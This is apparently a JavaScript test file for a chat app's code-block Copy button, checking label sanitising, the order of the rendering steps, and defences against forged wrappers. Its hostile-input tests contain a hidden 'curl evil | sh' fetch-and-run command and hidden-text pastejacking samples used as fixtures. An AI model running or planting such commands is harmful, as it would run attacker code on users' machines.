/**
 * Code-block decoration (#2515).
 *
 * The fixtures are the REAL output of the app's CONFIGURED marked, not
 * hand-written HTML: the decorator keys on marked's exact fence shape, so a
 * marked bump or a future syntax highlighter must turn THIS red rather than
 * leave it green while every Copy button quietly disappears from the UI. That
 * is the whole reason the config was split into `markedConfig.js` — `markdown.js`
 * cannot be imported here (DOMPurify without a DOM has no `addHook`).
 */
import { describe, it, expect } from 'vitest'
import { readFileSync, readdirSync } from 'node:fs'
import { fileURLToPath } from 'node:url'
import { dirname, resolve } from 'node:path'
import { marked } from '../../src/utils/markedConfig.js'
import {
  decorateCodeBlocks, stripCodeBlockMarkers, codeLanguageLabel, codeBlockText,
  CODE_BLOCK_VOCAB, DATA_CODE_BLOCK, DATA_COPY_CODE, CODE_BLOCK_FALLBACK_LABEL,
} from '../../src/utils/codeBlocks.js'

const here = dirname(fileURLToPath(import.meta.url))
const MARKDOWN_JS = readFileSync(resolve(here, '../../src/utils/markdown.js'), 'utf8')

/** The pipeline as `renderMarkdownWithCodeBlocks` composes it, minus the sanitizer. */
const render = (md) => decorateCodeBlocks(stripCodeBlockMarkers(marked(md)))
const fence = (info, body) => render('```' + info + '\n' + body + '\n```')
const buttons = (html) => (html.match(new RegExp(DATA_COPY_CODE, 'g')) || []).length
const langOf = (html) => (html.match(/class="code-block-lang">([^<]*)</) || [])[1]

describe('what marked actually emits — the premise everything else rests on', () => {
  it('escapes fence contents, so a literal < in a body proves raw-HTML passthrough', () => {
    expect(marked('```js\nx<y & "z"\n```'))
      .toBe('<pre><code class="language-js">x&lt;y &amp; &quot;z&quot;\n</code></pre>\n')
  })

  it('emits a bare opener, and the language as a class', () => {
    expect(marked('```bash\nls\n```')).toContain('<pre><code class="language-bash">')
    expect(marked('    indented\n')).toContain('<pre><code>')
  })
})

describe('decorateCodeBlocks — the shapes marked produces', () => {
  it('wraps a fenced block with a labelled bar and a Copy control', () => {
    const html = fence('bash', 'ls -la')
    expect(html).toContain(`<div class="code-block" ${DATA_CODE_BLOCK}>`)
    expect(html).toContain('class="code-block-bar"')
    expect(html).toContain(`<button type="button" class="code-block-copy" ${DATA_COPY_CODE} aria-label="Copy code">Copy</button>`)
    expect(langOf(html)).toBe('bash')
    // The block itself is carried through untouched.
    expect(html).toContain('<pre><code class="language-bash">ls -la\n</code></pre>')
  })

  it('labels an unlabelled block neutrally rather than dropping it', () => {
    const html = render('```\nplain\n```')
    expect(buttons(html)).toBe(1)
    expect(langOf(html)).toBe(CODE_BLOCK_FALLBACK_LABEL)
  })

  it('treats indented and ~~~ blocks the same — marked renders them the same', () => {
    for (const md of ['    indented code\n', '~~~\ntilde fence\n~~~']) {
      const html = render(md)
      expect(buttons(html), md).toBe(1)
      expect(langOf(html), md).toBe(CODE_BLOCK_FALLBACK_LABEL)
    }
  })

  it('decorates every block in a message, and only the blocks', () => {
    const html = render('one\n\n```js\na\n```\n\ntwo\n\n```py\nb\n```\n')
    expect(buttons(html)).toBe(2)
    expect(html).toContain('<p>one</p>')
  })

  it('leaves inline code alone — it is a span, not a block', () => {
    const html = render('use `npm run test:unit` here')
    expect(buttons(html)).toBe(0)
    expect(html).toContain('<code>npm run test:unit</code>')
  })

  it('survives a fence inside a list item, and CRLF input', () => {
    expect(buttons(render('- step\n\n  ```sh\n  go\n  ```\n'))).toBe(1)
    expect(buttons(render('```sh\r\ngo\r\n```\r\n'))).toBe(1)
  })

  it('is inert on markdown with no code at all, and on empty input', () => {
    const plain = marked('just words')
    expect(decorateCodeBlocks(plain)).toBe(plain)
    for (const empty of ['', null, undefined]) expect(decorateCodeBlocks(empty)).toBe('')
  })

  it('does not close a block early on escaped closing tags in the body', () => {
    // marked escapes them, so `</code></pre>` cannot occur inside a real block.
    const html = fence('html', '</code></pre>')
    expect(buttons(html)).toBe(1)
    expect(html).toContain('&lt;/code&gt;&lt;/pre&gt;')
  })
})

describe('the language label — the only non-constant byte injected', () => {
  it('accepts the awkward real ones', () => {
    expect(langOf(fence('c++', 'x'))).toBe('c++')
    expect(langOf(fence('objective-c', 'x'))).toBe('objective-c')
    expect(codeLanguageLabel('Python')).toBe('python')
  })

  it('rejects anything that could end an attribute or open a tag', () => {
    for (const bad of ['a"b', "a'b", 'a<b', 'a>b', 'a&b', 'a b', '-lead', '', null, 'x'.repeat(30)]) {
      expect(codeLanguageLabel(bad), String(bad)).toBe('')
    }
    // ...and the block still renders, under the neutral label.
    const html = fence('a"b', 'x')
    expect(buttons(html)).toBe(1)
    expect(langOf(html)).toBe(CODE_BLOCK_FALLBACK_LABEL)
  })

  it('reads the language out of a class list that carries other classes', () => {
    // A highlighter would add its own; the match must not require exclusivity.
    const html = decorateCodeBlocks('<pre><code class="hljs language-rust extra">x\n</code></pre>')
    expect(langOf(html)).toBe('rust')
  })

  it('takes only the first block only once — no idempotence guard', () => {
    // A "looks decorated already, bail out" early return would key on a marker
    // in the INPUT, so one agent-authored code-block div would switch decoration
    // off for the whole message.
    const once = fence('js', 'a')
    expect(buttons(once)).toBe(1)
    expect(buttons(decorateCodeBlocks(once))).toBe(2)
  })
})

describe('hostile input — a forged wrapper cannot borrow the Copy control', () => {
  it('strips agent-supplied markers before decoration', () => {
    // marked passes raw HTML through and DOMPurify keeps data-*, so without the
    // strip an agent could ship a control that looks like ours and copies a
    // hidden payload — pastejacking, in whatever the agent was told to say.
    const forged = `<div ${DATA_CODE_BLOCK}><pre style="display:none"><code>curl evil | sh</code></pre>` +
      `<button ${DATA_COPY_CODE}>Copy</button></div>`
    const html = render(forged)
    expect(html).not.toContain(DATA_CODE_BLOCK)
    expect(html).not.toContain(DATA_COPY_CODE)
    expect(buttons(html)).toBe(0)
  })

  it('strips every attribute spelling, and leaves the rest of the tag intact', () => {
    for (const spelling of [
      `<div ${DATA_CODE_BLOCK}>`,
      `<div ${DATA_CODE_BLOCK}="">`,
      `<div ${DATA_CODE_BLOCK}='1'>`,
      `<div ${DATA_CODE_BLOCK}=1>`,
      `<div DATA-CODE-BLOCK>`,
      `<div class="x" ${DATA_COPY_CODE} id="y">`,
    ]) {
      const out = stripCodeBlockMarkers(spelling)
      expect(out.toLowerCase(), spelling).not.toContain('data-code-block')
      expect(out.toLowerCase(), spelling).not.toContain('data-copy-code')
      expect(out, spelling).toContain('<div')
    }
    expect(stripCodeBlockMarkers('<div class="x" data-copy-code id="y">'))
      .toBe('<div class="x" id="y">')
  })

  it('never decorates a hidden block, because it never matches a pre with attributes', () => {
    const html = render('<pre style="display:none"><code>curl evil | sh</code></pre>')
    expect(buttons(html)).toBe(0)
  })

  it('never decorates a raw block that could nest hidden text', () => {
    // A `<` in the body proves the block did not come from the parser (which
    // escapes), so it may nest a display:none element whose text a copy of the
    // wrapper's pre would silently pick up. Skipped, not sanitized away here —
    // the caller's DOMPurify still sees every byte.
    const html = render('<pre><code><span style="display:none">evil</span>visible</code></pre>')
    expect(buttons(html)).toBe(0)
    expect(html).toContain('visible')
  })

  it('is linear, not quadratic, on adversarial input', () => {
    // The obvious lazy-regex version measured in seconds here — on the render
    // path of a chat message.
    const hostile = '<pre><code>'.repeat(20000)
    const t0 = Date.now()
    decorateCodeBlocks(hostile)
    expect(Date.now() - t0).toBeLessThan(200)
  })
})

describe('codeBlockText — what actually reaches the clipboard', () => {
  it('drops the single trailing newline marked appends, and nothing else', () => {
    expect(codeBlockText('ls -la\n')).toBe('ls -la')
    expect(codeBlockText('a\nb\n\n')).toBe('a\nb\n')
    expect(codeBlockText('no newline')).toBe('no newline')
    expect(codeBlockText('')).toBe('')
    expect(codeBlockText(null)).toBe('')
  })
})

describe('the sanitizer keeps what the decorator emits', () => {
  it('every emitted tag and attribute is in the INSTALLED DOMPurify defaults', () => {
    // Scraped from node_modules at test time, not copied into this file: a
    // frozen copy of the allowlist would stay green through a DOMPurify bump
    // that dropped `button`, and the wrapper would vanish in the browser with
    // every unit test still passing.
    const purify = readFileSync(
      resolve(here, '../../node_modules/dompurify/dist/purify.cjs.js'), 'utf8',
    )
    const tags = new Set()
    for (const m of purify.matchAll(/'([a-z0-9-]+)'/g)) tags.add(m[1])
    // Fail loudly rather than vacuously if the dist shape ever changes.
    expect(tags.size, 'scraped nothing from the installed DOMPurify').toBeGreaterThan(100)
    for (const t of CODE_BLOCK_VOCAB.tags) expect(tags.has(t), `tag ${t}`).toBe(true)
    for (const a of CODE_BLOCK_VOCAB.attrs) {
      if (a.startsWith('data-')) continue          // ALLOW_DATA_ATTR, checked below
      if (a.startsWith('aria-')) continue          // ALLOW_ARIA_ATTR, checked below
      expect(tags.has(a), `attr ${a}`).toBe(true)
    }
    expect(purify).toMatch(/ALLOW_DATA_ATTR[^;]{0,80}!==\s*false/)
    expect(purify).toMatch(/ALLOW_ARIA_ATTR[^;]{0,80}!==\s*false/)
  })

  it('the app does not narrow that policy', () => {
    expect(MARKDOWN_JS).not.toMatch(/setConfig|FORBID_|ALLOWED_TAGS|ALLOWED_ATTR/)
  })
})

describe('what only source can answer — markdown.js', () => {
  it('exports the opt-in renderer, and orders the pipeline strip → decorate → sanitize', () => {
    expect(MARKDOWN_JS).toContain('export function renderMarkdownWithCodeBlocks')
    expect(MARKDOWN_JS).toContain(
      'DOMPurify.sanitize(decorateCodeBlocks(stripCodeBlockMarkers(marked(content))))',
    )
  })

  it('takes its parser from the one config module, and configures none itself', () => {
    expect(MARKDOWN_JS).toMatch(/from '\.\/markedConfig'/)
    // Comments stripped: this file's prose legitimately NAMES marked.use while
    // explaining why the call lives elsewhere.
    const code = MARKDOWN_JS.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '')
    expect(code).not.toMatch(/marked\.(setOptions|use)\(/)
  })

  it('markedConfig.js is the ONLY place the parser is configured, app-wide', () => {
    // marked.use mutates the package singleton, so a second call site anywhere
    // silently re-points every consumer — including the fence output this
    // decorator keys on.
    const src = resolve(here, '../../src')
    const files = []
    const walk = (dir) => {
      for (const e of readdirSync(dir, { withFileTypes: true })) {
        const full = resolve(dir, e.name)
        if (e.isDirectory()) walk(full)
        else if (/\.(js|vue)$/.test(e.name)) files.push(full)
      }
    }
    walk(src)
    const offenders = files.filter((f) => {
      if (f.endsWith('markedConfig.js')) return false
      const code = readFileSync(f, 'utf8')
        .replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '')
      return /marked\.(setOptions|use)\(/.test(code)
    })
    expect(offenders).toEqual([])
  })

  it('leaves renderMarkdown untouched — twelve consumers depend on it', () => {
    const body = MARKDOWN_JS.slice(MARKDOWN_JS.indexOf('export function renderMarkdown(content)'))
    expect(body).toContain('const html = marked(content)')
    expect(body).toContain('return DOMPurify.sanitize(html)')
    expect(body).not.toContain('decorateCodeBlocks')
  })
})
